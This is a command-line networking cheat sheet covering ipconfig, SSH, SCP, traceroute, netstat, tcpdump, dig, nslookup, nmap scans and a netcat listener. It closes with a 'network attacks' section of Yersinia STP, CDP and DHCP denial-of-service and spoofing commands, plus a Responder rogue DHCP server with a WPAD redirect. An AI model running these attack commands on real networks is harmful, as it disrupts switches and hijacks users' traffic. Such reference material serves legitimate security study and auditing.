# ========
# ipconfig (Windows)
# ========
ipconfig /all # Display full configuration informatio
ipconfig /release [adapter] # Release the IPv4 address for the specified adapter.
ipconfig /release6 [adapter] # Release the IPv6 address for the selected adapter.
ipconfig /renew [adapter] # Renew the IPv4 address for the specified adapter.
ipconfig /renew6 [adapter] # Renew the IPv6 address for the specified adapter.
ipconfig /displaydns # Display the contents of the DNS Resolver Cache.
ipconfig /flushdns # Purges the DNS Resolver cache.
ipconfig /registerdns # Refreshes all DHCP leases and re-registers DNS names.
ipconfig /showclassid [adapter]	# Displays all the DHCP class IDs allowed for the adapter.
pconfig /setclassid [adapter] [ClassID] # Modifies the DHCP class id.

# ===
# SSH
# ===
ssh root@192.168.1.5 # Connect on default port 22
ssh root@192.168.1.5 -p 6222 # Connect on a specific port
ssh -i /path/file.pem root@192.168.1.5 # Conncect via pem file
ssh root@192.168.1.5 'ls -l' # Execute a remote command
ssh root@192.168.1.5 bash < script.sh # Invoke a local script
ssh root@192.168.1.5 "tar cvzf - ~/source" > output.tgz # Compresses and downloads from a server
ssh -J proxy_host1 remote_host2 # Proxy jump
ssh -J user@proxy_host1:port1,user@proxy_host2:port2 user@remote_host3 # Multiple proxy jumps

# SSH KeyGen
# NOTE: SSH key types: rsa, ed25519, dsa, ecdsa
ssh-keygen # Generate a new key
ssh-keygen -f ~/.ssh/filename # Specify a filename
ssh-keygen -y -f private.key > public.pub # Generate a public key from a private key
ssh-keygen -p -f ~/.ssh/id_rsa # Change private key passphrase
ssh-keygen -t rsa -b 4096 -C "your@mail.com" # -t Type of key, -b The number of bits in the key, -C	Provides a new comment
ssh-keygen -R <ip/hostname> # Removes the entry for the specified <ip/hostname> from the known_hosts file

# SSH Config Locations
/etc/ssh/ssh_config	# System-wide config
~/.ssh/config	# User-specific config
~/.ssh/id_{type}	# Private key
~/.ssh/id_{type}.pub	# Public key
~/.ssh/known_hosts	# Logged in host
~/.ssh/authorized_keys	# Authorized Keys

# SCP
scp user@server:/dir/file.ext dest/ # Copies from remote to local
scp user@server:/file user@server:/dir # Copies between two servers
scp dest/file.ext user@server:/dir # Copies from local to remote
scp -r user@server:/dir dest/ # Copies a whole folder
scp user@server:/dir/* dest/ # Copies all files from a folder
scp user@server:/dir/* . # Copies from a server folder to the current folder

# SFTP
sftp username@hostname # Connect and initiate an SFTP Session
put local_file remote_path # Upload local files to remote host
get remote_file local_path # Download files from remote host
ls [remote_path] # Lists remote host directory contents
cd remote_directory # Change directories in remote host

# ==========
# Traceroute
# ==========
traceroute google.com # Basic Traceroute
traceroute -h 20 google.com # Setting Maximum Hops
traceroute -q 5 google.com # Specifying Number of Queries
traceroute -w 2 google.com # Setting Timeout
traceroute -n google.com # Displaying IP Addresses
traceroute -I google.com # Using ICMP Echo Requests
traceroute -T google.com # Using TCP SYN Packets
traceroute -U google.com # Using UDP Datagrams
traceroute -p 80 google.com # Specifying Destination Port
traceroute -s 192.168.0.1 google.com # Specifying Source IP Address
traceroute -d google.com
traceroute -F google.com # Setting "Don't Fragment" Flag
traceroute -n -A google.com # Displaying IP Addresses and AS Numbers

# =======
# Netstat 
# =======
# Netstat is a command-line network utility that displays network connections for Transmission Control Protocol, routing tables, and a number of network interface and network protocol statistics.
netstat -a # Display All Active Connections
netstat -l # Display Listening Ports
netstat -lt # Display Listening TCP Ports with Numeric Addresses
netstat -lu # Display Listening UDP Ports with Numeric Addresses
netstat -p # Display PID and Program Name for Each Connection
netstat -r # Display Kernel Routing Table Information
netstat -st # Display Network Statistics for TCP
netstat -su # Display Network Statistics for UDP
netstat -i # Display Network Interfaces and Their State
netstat -pant # Display Network Services with PID and User
netstat -ltp # Display Listening Ports with Process Names
netstat -atp # Display All TCP Connections with Process Names
netstat -aup # Display All UDP Connections with Process Names
netstat -atun # Display All Established Connections (TCP and UDP)
netstat -t -e # Display Detailed Statistics for TCP Connections
netstat -i 1 # Display Network Interface Statistics Continuously


# =======
# tcpdump
# =======
# TCPDump is a powerful command-line packet analyzer tool.

# Capture Packets on a Specific Interface
tcpdump -i eth0 # Capture Packets on a Specific Interface
tcpdump port 80 # Capture Packets on a Specific Port
tcpdump host 192.168.1.100 # Capture Packets with a Specific Host
tcpdump icmp # Capture Packets with a Specific Protocol
tcpdump src 192.168.1.100 # Capture Packets with a Specific Source
tcpdump dst 192.168.1.200 # Capture Packets with a Specific Destination
tcpdump udp port 53 # Capture Packets with a Specific Protocol and Port
tcpdump less 64 # Capture Packets with a Specific Size:
tcpdump src port 1024 # Capture Packets with a Specific Source Port
tcpdump dst port 22 # Capture Packets with a Specific Destination Port
tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-ack) != 0' # Capture Packets with a Specific TCP Flag (e.g., SYN, ACK)
tcpdump vlan 10 # Capture Packets with a Specific VLAN ID
tcpdump -A # Capture Packets and Display in ASCII:
tcpdump -X # Capture Packets and Display in HEX and ASCII:
tcpdump -w capture.pcap # Capture Packets and Save to a File:
tcpdump -r capture.pcap # Read Packets from a Saved File:
tcpdump -c 100 # Capture Packets and Limit the Number of Packets:
tcpdump -tttt # Capture Packets and Display Timestamps:

# ===
# Dig
# ===
dig google.com # Basic DNS Query
dig example.com A # Query Specific DNS Record Types
dig -x 8.8.8.8 # Reverse DNS Lookup
dig example.com @dns-server-ip # Querying a Specific DNS Server
dig +short example.com # Displaying Additional Information
dig +trace example.com # Trace DNS Delegation
dig +dnssec example.com # Checking DNSSEC Information
dig A google.com +nocmd +noall +answer +ttlid # Checking Time to Live (TTL) of DNS Records
dig example.com ANY # Querying Multiple DNS Records
dig @dns-server-ip -b source-ip example.com # Performing a DNS Query with Specific Source IP
dig MX apple.com +short # Email Servers Responsible for a Domain
dig A cyberciti.biz @1.1.1.1 +short # Finding out DNS answers from specific cache resolver
dig nixcraft.com +nssearch # Finding if a zone is synchronized with all authoritative name servers (look for serial number)
dig TXT o-o.myaddr.l.google.com @ns1.google.com +short # What is my public IPv4 or IPv6 address?

# Dig Batch Query
# Make a file and enter the domains you'd like to dig into
nano domain_names.txt
google.com
meta.com
netflix.com
# Batch Query the Domains with the file passed as a parameter
dig -f domain_name.txt +short

# ========
# nslookup
# ========
# NSLOOKUP (Name Server Lookup) is a powerful command-line tool used for querying Domain Name System (DNS) servers to obtain domain name or IP address mapping, as well as other DNS-related information. 
nslookup [domain_name] # Basic Query
nslookup [IP_address] # Reverse DNS lookup
set type=[record_type] # Specify DNS Record to Query
set querytype=[record_type] # Sets the query type for subsequent queries.
server [DNS_server] # Specify a particular DNS server to query.
ls [domain_name] # Performs a zone transfer for the specified domain name, listing all the DNS records for that domain
set debug # Enable Debugging mode
set timeout=[seconds] # Sets the timeout for DNS queries

# ====
# Nmap
# ====
nmap -sT <Target> # TCP Connect Scan
nmap -sS <Target> # TCP SYN Scan 
nmap -sA <Target> # TCP ACK Scan
nmap -sU <Target> # UDP Scan
nmap -sF <Target> # FIN Scan
nmap -sN <Target> # NULL Scan
nmap -sW <Target> # Windows Scan
nmap -sX <Target> # Xmas Scan
nmap -sM <Target> # Maimon Scan
nmap -iL list_of_hosts.txt. # Scan a list of hosts from a file
nmap -sL -n 10.10.12.13/29. # List the IP addresses in the specified range without actually probing them for open ports, and it will skip DNS resolution for those addresses
nmap -PR -sn <TARGETS># ARP scan without port-scanning. -PR indicates only ARP scan
sudo nmap -PE -sn 10.10.68.220/24
sudo nmap -PP -sn 10.10.68.220/24
sudo nmap -PM -sn 10.10.68.220/24
sudo nmap -PP -sn 10.10.68.220/24
nmap -PS -sn MACHINE_IP/24 # TCP Syn Ping
sudo nmap -PA -sn MACHINE_IP/24 # TCP ACK Ping
sudo nmap -PU -sn 10.10.68.220/24 # UDP Ping Scan

# Arp-Scan
# Send ARP queries to all valid IP addresses on your local networks
arp-scan -l 
arp-scan --localnet
arp-scan -I eth0 -l # Send ARP queries for all valid IP addresses on the eth0 interface

# Masscan
 
# ======
# Netcat
# ======
# Netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP

nc [TargetIPaddr] [port] # Fundamental Netcat Client
nc -lvnp [LocalPort] # Fundamental Netcat Listener


# ===============
# NETWORK ATTACKS
# ===============

# STP BPDU DoS
yersinia stp -attack 2 # Yersinia is a network tool primarily used for network exploitation and security auditing
yersinia stp -attack 3

# STP TCN Attack
yersinia stp -attack 1 #Will send 1 TCN packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen

# STP Root Attack
yersinia stp -attack 4 # Behaves like the root switch
yersinia stp -attack 5 # This will make the device behaves as a switch but will not be root

# Cisco Discover Protocol (CDP) Table Flooding
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices

# CDP Impersonation Attack
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet

# DHCP DoS 
yersinia dhcp -attack 1 # Flood with DHCP Discover packets
yersinia dhcp -attack 3 

# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R

# 











